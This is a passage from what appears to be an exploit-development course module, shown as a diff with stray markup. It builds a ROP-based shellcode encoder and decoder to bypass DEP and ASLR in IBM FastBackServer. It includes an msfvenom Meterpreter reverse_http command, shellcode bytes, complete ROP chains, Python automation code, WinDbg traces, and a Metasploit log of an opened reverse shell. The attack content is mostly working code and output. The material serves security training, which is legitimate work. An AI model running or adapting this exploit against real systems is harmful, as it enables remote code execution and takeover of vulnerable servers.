+eip=01bb2c14 esp=1111e30c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+libeay32IBM019!N98E_bn_sub_words+0x108c:
+01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx ds:0023:01bb2c1e=9a884739
+Listing 64 - Access violation due to shellcode decoding stub
+The highlighted assembly instruction attempted to modify a memory location pointed to by EAX+0x1A, which caused the crash.
+From Listing 64 we notice that EAX points to an address within the code cave where the shellcode has been copied. We're encountering an access violation error because the shellcode's decoding stub expects the code to be stored in writable memory, but it is not.
+This means we won't be able to use the msfvenom encoder, so we'll have to find a different solution. Fortunately, we have a few options.
+We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it's copied into the code section. In the next section, we'll pursue the latter approach.
+Exercises
+1.	Calculate the offset from the ROP chain to the dummy shellcode.
+2.	Insert shellcode into the buffer at the correct offset and observe the decoder causing a crash.
+10.4.3. Handmade ROP Decoder
+At this point, we know we need to avoid bad characters in our shellcode and can not rely on the msfvenom decoder. In this section, we'll learn how to manually implement a ROP decoder and test it.
+First, let's replace the bad characters with safe alternatives that will not break the exploit. To begin, we'll select arbitrary replacement characters, as shown in Listing 65.
+0x00 -> 0xff
+0x09 -> 0x10
+0x0a -> 0x06
+0x0b -> 0x07
+0x0c -> 0x08
+0x0d -> 0x05
+0x20 -> 0x1f
+Listing 65 - Character substitution scheme
+To implement this technique, we'll first generate a windows/meterpreter/reverse_http payload in Python format (without encoding it):
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f python -v shellcode
+...
+No encoder or badchars specified, outputting raw payload
+Payload size: 596 bytes
+Final size of python file: 3336 bytes
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+...
+Listing 66 - Encoded Meterpreter shellcode
+Since we're going to manually replace these characters for now, we'll only work on the first 20 bytes of the shellcode to determine if the technique works.
+Listing 67 shows the substitutions performed on the substring.
+Before:
+\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52
 
-```nasm
+After:
+\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52
+Listing 67 - First characters are substituted
+We can easily make these manual edits in our shellcode with a Python script. However, restoring the script with ROP at runtime is more challenging.
+Let's start by creating a ROP chain to restore the first 0x00 byte, which was replaced with an 0xff byte.
+Our complete ROP chain will perform three actions going forward. First, it will patch the arguments for WriteProcessMemory, then it will restore the shellcode, and finally, it will execute WriteProcessMemory.
+Below is the ROP chain we'll use to restore the first bad character.
+# Restore first three shellcode bytes
+rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
+rop += pack("<L", (negative value))	    # negative offset
+rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
+rop += pack("<L", (original value))      # value into BH
+rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret
+Listing 68 - ROP gadgets to fix a bad character
+This new ROP chain will be inserted just after the gadgets that patch nSize on the stack. At this point, EAX will contain the stack address where the nSize argument is stored. To align EAX with the first bad character to fix, we can pop an appropriate negative value into ECX and subtract it from EAX.
+pop ecx ; ret
+negative offset
+sub eax, ecx ;
+Listing 69 - Aligning EAX
+With EAX aligned, our next step is to restore the bad character. We will do this by loading an appropriate value into EBX and then adding the byte in BH to the value pointed to by EAX.
+pop ebx ; ret
+value into BH
+add [eax+1], bh ; ret
+Listing 70 - Restoring the bad character
+For every bad character that we have to decode, we'll need to determine both the negative offset value to subtract from EAX and the value to place into BH.
+First, let's find the correct value for BH. We are going to restore the bad character 0x00, which was replaced by the fourth byte in the shellcode, 0xff. We can add 0x01 to 0xff to restore the shellcode byte.
+We can load the correct value in BH while avoiding bad characters by popping the value 0x1111__01__11 into EBX.
+Next, let's calculate the negative offset. Recall that when the decoder ROP chain is executed, EAX points to nSize on the stack.
+Before moving forward with this step, we need to make a couple of adjustments to our proof of concept that will influence the negative offset we have to calculate. For each bad character we fix, we'll be increasing the size of our final ROP chain. To account for this, we'll adjust the lpBuffer (shellcode) address on the stack to create enough additional space.
+We will also increase the size of our entire input buffer to account for our larger combined offset and ROP chain. Listing 71 shows the first psCommandBuffer increased to 0x1100.
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)      # opcode
+buf += pack("<i", 0x0)        # 1st memcpy: offset
+buf += pack("<i", 0x1100)    # 1st memcpy: size field
+buf += pack("<i", 0x0)        # 2nd memcpy: offset
+buf += pack("<i", 0x100)      # 2nd memcpy: size field
+buf += pack("<i", 0x0)        # 3rd memcpy: offset
+buf += pack("<i", 0x100)      # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+Listing 71 - Update size of psCommandBuffer
+Next, let's modify the address stored in lpBuffer.
+# Patching lpBuffer
+rop = pack("<L", (dllBase + 0x296f)) # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242)) # junk into esi
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0x88888888))
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0x77777d78))
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+rop += pack("<L", (0x42424242)) # junk into esi
+rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
+...
+Listing 72 - Increase address of lpBuffer
+In Listing 72, we increased the offset from the start of the ROP chain to the beginning of our shellcode (lpBuffer) from 0x100 to 0x600 by modifying the highlighted value.
+Additionally, we must ensure that the subtraction we perform to align EAX with the ROP skeleton takes this 0x500 byte offset into account.
+...
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0xfffff9e0)) # pop into eax
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
+...
+Listing 73 - Aligning EAX with ROP skeleton
+This alignment is performed by adding the value 0xfffff9e0, which is 0x500 bytes less than the previous value of 0xfffffee0, as shown in Listing 73.
+After this change, we must determine the negative offset from the stack address pointing to nSize to the first bad character in the shellcode. This calculation is tricky, so we'll find it dynamically instead.
+As previously mentioned, at this point of the ROP chain execution, EAX contains the stack address of nSize. To locate the correct offset, we can pop a dummy value like 0xffffffff into ECX, which is then subtracted from EAX to perform the alignment. We will then use the debugger to determine the correct value to subtract at runtime.
+Taking these modifications into consideration, we can craft the updated code shown in Listing 74.
+# Restore first shellcode byte
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xffffffff))	
+rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
+rop += pack("<L", (0x11110111)) # 01 in bh
+rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret
 
-```
+# Align ESP with ROP Skeleton
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xffffffec)) # -14
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
 
+offset2 = b"C" * (0x600 - len(rop))
+shellcode = b"\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52"
+padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
 
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
+buf += formatString
+Listing 74 - Adding dummy offset and encoded shellcode
+The lower part of Listing 74 includes the final changes, in which we have updated the offset2 variable to account for the increased size of psCommandBuffer and inserted the first 20 bytes of our custom-encoded shellcode.
+Once execution of the ROP chain reaches the decoding section, we can find the distance from EAX to the first 0xff byte in the encoded shellcode.
+Note that the instruction that decodes the bad character is "ADD [EAX+1], BH", which means we have to account for the additional one byte in our arithmetic calculation.
+Listing 75 shows WinDbg's output when the ROP chain reaches the "POP ECX" gadget in the decode section.
+eax=10bbe300 ebx=0603be40 ecx=0000020c edx=76fd1670 esi=42424242 edi=00669360
+eip=0316117c esp=10bbe3a4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!Ordinal1715+0x117c:
+0316117c 59              pop     ecx
 
-```nasm
+0:082> db eax + 61e L10
+10bbe91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
 
-```
+0:082> ? -61e
+Evaluate expression: -1566 = fffff9e2
+Listing 75 - Distance from EAX to first bad character
+Through trial and error, the debugger output reveals a distance of 0x61e bytes from EAX to the first bad character. This means that we must pop the value of 0xfffff9e2 into ECX and subtract that from EAX.
+Let's update the offset and rerun the proof of concept, so we can review the shellcode values on the stack before and after the decode instruction.
+eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360
+eip=019468ee esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
+019468ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:1477e91f=ff
 
+0:096> db eax L2
+1477e91e  82 ff                                      ..
 
-```nasm
+0:096> p
+eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360
+eip=019468f4 esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
+019468f4 c3              ret
 
-```
+0:096> db eax L2
+1477e91e  82 00
+Listing 76 - The first bad character is fixed with ROP
+From the output, we find the original character restored, which proves that the ROP decoding technique works.
+Next, we'll reuse the ROP chain we just developed to restore the next bad character. The next bad character is another null byte, which is substituted with 0xff, and it comes just after the previous bad character. We can once again align EAX by modifying the value popped into ECX.
+Since the next character to restore comes right after the previous character, we need to subtract the value 0xffffffff to increase EAX by one.
+The ROP chain to accomplish this is shown in Listing 77.
+# Restore second bad shellcode byte
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xffffffff))	
+rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
+rop += pack("<L", (0x11110111)) # 01 in bh
+rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret
+Listing 77 - ROP chain to fix the second bad character
+Next we'll restart FastBackServer, attach WinDbg, and set a breakpoint on libeay32IBM019+0x468ee to stop the execution at the "ADD [EAX+1], BH" instruction. Since we're interested in the second execution of the gadget, we must let execution continue the first time the breakpoint is hit.
+Listing 78 shows the results when the breakpoint has been triggered twice.
+eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360
+eip=032a68ee esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
+032a68ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:0dc4e62c=ff
 
+0:079> db eax-1 L3
+0dc4e62a  82 00 ff                                         ...
 
-```nasm
+0:079> p
+eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360
+eip=032a68f4 esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
+032a68f4 c3              ret
 
-```
+0:079> db eax-1 L3
+0dc4e62a  82 00 00 
+Listing 78 - Fixing the second bad character
+By adding the second sequence of decoding gadgets, we decoded the second bad character by putting 0x01 in BH and adding it to the 0xff encoded byte.
+We could use this technique to decode the entire shellcode, but it would be a tiresome, manual effort. In the next section, we'll use our thorough understanding of the decoding process to automate it.
+Exercises
+1.	Implement the ROP chain to fix the first and second bad characters in the shellcode, as shown in this section.
+2.	Continue to implement ROP chains to fix the third and fourth bad characters.
+10.4.4. Automating the Shellcode Encoding
+In this section, we'll begin the work of creating an automatic ROP encoder. This will allow our exploit to detect and encode bad characters in the shellcode without manual input. In the next section, we will develop code to dynamically generate the ROP chain that will decode the shellcode.
+Our first step towards automation is implementing an encoding routine to modify the shellcode. We'll follow the scheme we used earlier, which is repeated below.
+0x00 -> 0xff
+0x09 -> 0x10
+0x0a -> 0x06
+0x0b -> 0x07
+0x0c -> 0x08
+0x0d -> 0x05
+0x20 -> 0x1f
+Listing 79 - Character substitution scheme
+As part of the encoding routine, the script must keep track of the offsets where bytes are modified and how they are modified. Our script will reuse this information when the decoding ROP chain is created.
+Let's separate these requirements into two methods. First, we'll detect all bad characters with the mapBadChars function. Next, we'll use the encodeShellcode function to encode the shellcode.
+The code for mapBadChars is shown in Listing 80.
+def mapBadChars(sh):
+	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+	i = 0
+	badIndex = []
+	while i < len(sh):
+		for c in BADCHARS:
+			if sh[i] == c:
+				badIndex.append(i)
+		i=i+1
+	return badIndex
+Listing 80 - Function to detect all bad characters
+mapBadChars accepts the shellcode as its only argument. Inside the method, we first list all the bad characters, then we create the badIndex array to keep track of the location of the bad characters that are discovered in the shellcode.
+To discover the bad characters, we'll execute a while loop that iterates over all the bytes in the shellcode, comparing them with the list of bad characters. If a bad character is found, its index is stored in the badIndex array.
+When all of the bad characters have been found, we're ready for encoding with encodeShellcode, as displayed in Listing 81.
+def encodeShellcode(sh):
+	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+	REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
+	encodedShell = sh
+	for i in range(len(BADCHARS)):
+		encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
+	return encodedShell
+Listing 81 - Function to encode shellcode
+First, we list both the bad characters and the associated replacement characters. Then we will execute a loop over all the bad characters that have been detected in the shellcode and overwrite them with the corresponding replacement characters.
+At this point, we have fully encoded the shellcode with our custom encoding scheme and it no longer contains any bad characters.
+Exercises
+1.	Create mapBadChars to detect bad characters.
+2.	Create encodeShellcode to dynamically encode the first 20 bytes of the shellcode.
+10.4.5. Automating the ROP Decoder
+In the previous section, we developed an automated shellcode encoder by mapping and replacing bad characters. Now we can focus on the more complex decoding process. We'll need to build a decoding ROP chain to dynamically handle the bad characters found by mapBadChars.
+Essentially, our code must be able to handle an arbitrary amount of bad characters and arbitrary offsets, as well as a shellcode of unknown size.
+Let's tackle this task by breaking it down into smaller actions. First, we'll align EAX with the beginning of the shellcode. Next, we will perform a loop over each of the bad characters found by mapBadChars and add a sequence of ROP gadgets to fix it. Finally, we'll need to reset EAX to point back to the ROP skeleton.
+In the previous proof of concept, we aligned EAX by popping a negative value into ECX and subtracting it from EAX. We can reuse this same technique, but this time the subtraction of the value will point EAX to one byte before the start of the encoded shellcode. This way, our algorithm will be able to handle shellcode with a bad character as the first byte.
+The value we subtracted from EAX in the last section was 0xfffff9e2, and the first bad character was at offset 3 into the shellcode. That means we must subtract an additional 3 bytes, or 0xfffff9e5, to align EAX with the beginning of the shellcode.
+The updated alignment ROP chain is shown in Listing 82.
+# Align EAX with shellcode
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xfffff9e5))	
+rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
+Listing 82 - Aligning EAX with one byte prior to shellcode
+Now that we have aligned EAX with the beginning of the shellcode, we need to create a method that dynamically adds a ROP chain for each bad character.
+The generic ROP chain prototype is shown in Listing 83.
+rop += pack("<L", (dllBase + 0x117c))               # pop ecx ; ret
+rop += pack("<L", (offset to next bad characters))
+rop += pack("<L", (dllBase + 0x4a7b6))              # sub eax, ecx ; pop ebx ; ret
+rop += pack("<L", (value to add))                   # values in BH
+rop += pack("<L", (dllBase + 0x468ee))              # add [eax+1], bh ; ret
+Listing 83 - Generic ROP chain to fix a single bad character
+For each of these ROP chains, our code must calculate the offset from the previous bad character to the next. It must also ensure that the offset is popped into ECX, as highlighted in the listing above ("offset to next bad characters").
+Because the value is subtracted from EAX, we'll need to use its negative counterpart.
+We also need to add a value to the replacement character to restore the original bad character. We'll place this value into the second highlighted section from Listing 83. We must keep in mind that the value popped in EBX cannot contain a bad character, and only the byte in BH is used in the restore action.
+Let's start developing the decoding scheme.
+By performing the simple math shown in Listing 84, we obtain usable values for our decoding scheme.
+0x01 + 0xff = 0x00
+0xf9 + 0x10 = 0x09
+0x04 + 0x06 = 0x0a
+0x04 + 0x07 = 0x0b
+0x04 + 0x08 = 0x0c
+0x08 + 0x05 = 0x0d
+0x01 + 0x1f = 0x20
+Listing 84 - Values to add to restore original characters
+Next we'll create the decodeShellcode method, which will use the values shown above to generate the ROP chain to decode the shellcode.
+decodeShellcode will require three arguments; the base address of libeay32IBM019, the indexes of the bad characters in the shellcode, and the unencoded shellcode.
+The code for decodeShellcode is shown in Listing 85.
+def decodeShellcode(dllBase, badIndex, shellcode):
+	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+	CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
+	restoreRop = b""
+	for i in range(len(badIndex)):
+		if i == 0:
+			offset = badIndex[i]
+		else:
+			offset = badIndex[i] - badIndex[i-1]
+		neg_offset = (-offset) & 0xffffffff
+		value = 0
+		for j in range(len(BADCHARS)):
+			if shellcode[badIndex[i]] == BADCHARS[j]:
+				value = CHARSTOADD[j]
+		value = (value << 8) | 0x11110011
 
+		restoreRop += pack("<L", (dllBase + 0x117c))    # pop ecx ; ret
+		restoreRop += pack("<L", (neg_offset))
+		restoreRop += pack("<L", (dllBase + 0x4a7b6))	# sub eax, ecx ; pop ebx ; ret
+		restoreRop += pack("<L", (value))               # values in BH
+		restoreRop += pack("<L", (dllBase + 0x468ee))   # add [eax+1], bh ; ret
+	return restoreRop
+Listing 85 - Method to decode shellcode with ROP
+First we'll list the possible bad characters and the associated characters we want to add. Next, we can create an accumulator variable (restoreRop) that will contain the entire decoding ROP chain.
+Next, we need to perform a loop over all the bad character indexes. For each entry, we'll calculate the offset from the previous bad character to the current bad character. This offset is negated and assigned to the neg_offset variable and used in the ROP chain for the POP ECX instruction.
+To determine the value to add to the replacement character, we can perform a nested loop over all possible bad characters to determine which one was present at the corresponding index. Once the value is found, it is stored in the value variable.
+Since the contents of value must be popped into BH, we have to left-shift it by 8 bits. This will produce a value that is aligned with the BH register but contains NULL bytes. To solve the NULL byte problem, we will perform an OR operation with the static value 0x11110011.
+Finally, the result is written to the ROP chain where it will be popped into EBX at runtime.
+This complex process enables us to perform custom encoding that avoids bad characters during network packet processing. This process also allows us to decode the shellcode before it is copied to the non-writable code cave.
+To use decodeShellcode, we'll call it just after the ROP chain that aligns EAX with the beginning of the shellcode.
+# Align EAX with shellcode  
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xfffff9e5))	
+rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
+rop += pack("<L", (0x42424242)) # junk into eb
 
-```nasm
+rop += decodeShellcode(dllBase, pos, shellcode)
 
-```
+# Align ESP with ROP Skeleton
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xffffffec)) # -14
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
 
+offset2 = b"C" * (0x600 - len(rop))
+padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(encodedShellcode))
 
-```nasm
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+encodedShellcode+padding,0,0,0,0)
+buf += formatString
+Listing 86 - Calling decodeShellcode
+With the proof of concept updated, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the ROP gadget where EAX is aligned with the shellcode. When the exploit is executed, we can verify our decoder in WinDbg:
+0:078> bp libeay32IBM019+0x4a7b6
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
 
-```
+0:078> g
+Breakpoint 0 hit
+eax=149de300 ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360
+eip=0325a7b6 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x386:
+0325a7b6 2bc1            sub     eax,ecx
 
-```nasm
+0:098> p
+eax=149de91b ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360
+eip=0325a7b8 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x388:
+0325a7b8 5b              pop     ebx
 
-```
+0:098> db eax L10
+149de91b  43 fc e8 82 ff ff ff 60-89 e5 31 c0 64 8b 50 30  C......`..1.d.P0
 
+0:098> g
+Breakpoint 0 hit
+eax=149de91b ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
+eip=0325a7b6 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x386:
+0325a7b6 2bc1            sub     eax,ecx
 
-```nasm
+0:098> p
+eax=149de91e ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
+eip=0325a7b8 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x388:
+0325a7b8 5b              pop     ebx
 
-```
+0:098> db eax L10
+149de91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
+Listing 87 - Alignment of the decoder
+Listing 87 shows that the first time the breakpoint is hit, EAX is aligned with the beginning of the shellcode (minus one byte, to account for the offset in the write gadget).
+The second time the breakpoint is triggered, EAX becomes aligned with the first replacement character. At this point, we can step through the decoding routine and restore the bad character in the shellcode.
+0:098> p
+eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
+eip=0325a7b9 esp=149de3c0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x389:
+0325a7b9 c3              ret
 
+0:098> p
+eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
+eip=032568ee esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
+032568ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:149de91f=ff
 
-```nasm
+0:098> p
+eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
+eip=032568f4 esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
+libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
+032568f4 c3              ret
 
-```
+0:098> db eax L10
+149de91e  82 00 ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
+Listing 88 - Dynamic ROP chain to fix a bad character
+In Listing 88, we stepped through the decoding routine for the first bad character and found that the ROP chain restored it correctly.
+Let's allow execution to continue, triggering the breakpoint an additional two times. We can then check the contents of the shellcode after executing the decoding routine against two more bad characters:
+0:000> db 149de91e L10
+149de91e  82 00 00 00 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
+Listing 89 - Dynamic ROP chain has fixed 3 bad characters
+These results confirm that our process is working, since our exploit has dynamically detected the three bad characters, replaced them, and generated the required ROP decoder.
+We're now ready to replace the truncated shellcode with our complete shellcode. Our exploit will dynamically encode and decode the shellcode to avoid bad characters and decode the payload in the non-writable code cave.
+Our exploit can decode the shellcode, but we are still missing a final step. We need to restore EAX to the start of the ROP skeleton before we execute the XCHG ROP gadget.
+If we restart FastBackServer, attach WinDbg, and set a breakpoint on the gadget that aligns EAX with the shellcode (libeay32IBM019+0x4a7b6), we can find the distance from the ROP skeleton to EAX, as shown in Listing 90.
+eax=110ae91b ebx=0612aad8 ecx=fffff9e5 edx=76fd1670 esi=42424242 edi=00669360
+eip=0327a7b8 esp=110ae3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_BIO_f_cipher+0x388:
+0327a7b8 5b              pop     ebx
 
+0:084> dd eax-62f L7
+110ae2ec  75342890 032c2c04 ffffffff 032c2c04
+110ae2fc  110ae91c 0000020c 0331401c 
+Listing 90 - Finding offset from shellcode to ROP skeleton
+Through trial and error, we discover that the difference from EAX to the start of the ROP skeleton is 0x62f.
+We can add this value to the index of the last bad character to dynamically determine the distance from EAX when the ROP chain completes the decoding process.
+The updated ROP chain segment in Listing 91 calculates the required offset.
+# Align ESP with ROP Skeleton
+skeletonOffset = (-(pos[len(pos)-1] + 0x62f)) & 0xffffffff
+rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
+rop += pack("<L", (skeletonOffset))    # dynamic offset
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
+Listing 91 - ROP chain to align EAX with ROP skeleton
+The offset stored in the skeletonOffset variable is found from the last entry of the array of indexes associated with the bad characters.
+To verify that the dynamically-found offset is correct, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the "XCHG EAX, ESP" ROP gadget. Then, we'll run the updated exploit.
+0:084> bp libeay32IBM019+0x5b415
 
-```nasm
+0:084> g
+Breakpoint 0 hit
+eax=110ae2ec ebx=11110111 ecx=fffff76c edx=76fd1670 esi=42424242 edi=00669360
+eip=0328b415 esp=110ae744 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
+0328b415 94              xchg    eax,esp
 
-```
+0:084> dd eax L7
+110ae2ec  75342890 032c2c04 ffffffff 032c2c04
+110ae2fc  110ae91c 0000020c 0331401c 
+Listing 92 - Correctly aligned EAX
+We find that EAX has been correctly realigned with the address for WriteProcessMemory, which is stored on the stack.
+Once EAX is aligned with the ROP skeleton and the XCHG ROP gadget is executed, our exploit has performed all the steps required to execute WriteProcessMemory and copy the decoded shellcode into the code cave.
+As a final proof that the exploit works, we can set up a Metasploit multi/handler and execute our exploit without WinDbg attached.
+msf5 exploit(multi/handler) > exploit
 
+[*] Started HTTP reverse handler on http://192.168.119.120:8080
+[*] http://192.168.119.120:8080 handling request from 192.168.120.10; (UUID: zj3o53wp) Staging x86 payload (181337 bytes) ...
+[*] Meterpreter session 1 opened (192.168.119.120:8080 -> 192.168.120.10:53328)
 
-```nasm
+meterpreter > 
+Listing 93 - Getting a reverse shell from FastBackServer with ASLR enabled
+Excellent! We have bypassed both ASLR and DEP, dynamically encoded and decoded our shellcode with ROP, and obtained a reverse shell.
+Our encoding and decoding technique is now fully-automated and dynamic, making it easy to replace our shellcode in the future.
+Exercises
+1.	Implement decodeShellcode to dynamically create the decoding ROP chain and ensure that it works.
+2.	Dynamically align EAX prior to executing the "XCHG EAX, ESP" gadget so that execution returns into WriteProcessMemory.
+3.	Combine all the pieces in this module to obtain a reverse shell while bypassing both ALSR and DEP.
+Extra Mile
+Create an exploit that resolves VirtualProtect instead of WriteProcessMemory through the FXCLI_DebugDispatch function. Then build a ROP chain to achieve code execution while bypassing both ASLR and DEP.
+Extra Mile
